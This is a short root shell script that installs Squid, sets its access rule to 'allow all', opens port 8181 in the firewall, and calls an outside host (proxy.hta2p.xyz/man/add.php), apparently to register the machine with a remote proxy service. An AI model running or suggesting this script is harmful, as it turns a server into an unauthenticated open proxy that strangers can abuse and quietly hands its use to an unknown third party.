#!/bin/sh
apt install squid && systemctl start squid && systemctl enable squid && sed -i 's/http_access deny all/http_access allow all/' /etc/squid/squid.conf && sed -i 's/http_port 3128/http_port 8181/' /etc/squid/squid.conf && systemctl restart squid && ufw allow 8181 && sleep 1;
sleep 3;
curl http://proxy.hta2p.xyz/man/add.php
sleep 1;
systemctl status squid
